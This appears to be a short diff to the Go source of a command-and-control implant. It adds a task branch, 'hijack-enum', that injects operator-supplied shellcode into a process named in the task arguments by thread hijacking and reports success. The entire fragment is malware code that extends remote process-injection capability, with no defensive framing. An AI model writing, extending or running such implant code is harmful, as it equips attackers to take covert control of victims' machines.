@@ -268,6 +268,11 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 				if err == nil {
 					output = []byte("[+] Shellcode injected via thread hijacking")
 				}
+			} else if len(task.Args) > 1 && task.Args[1] == "hijack-enum" {
+				err = injectThreadHijackEnumCrossPlatform(task.Args[0], task.Data)
+				if err == nil {
+					output = []byte(fmt.Sprintf("[+] Shellcode injected via thread hijacking into %s", task.Args[0]))
+				}
 			} else {
 				pid := 0
 				fmt.Sscanf(task.Args[0], "%d", &pid)
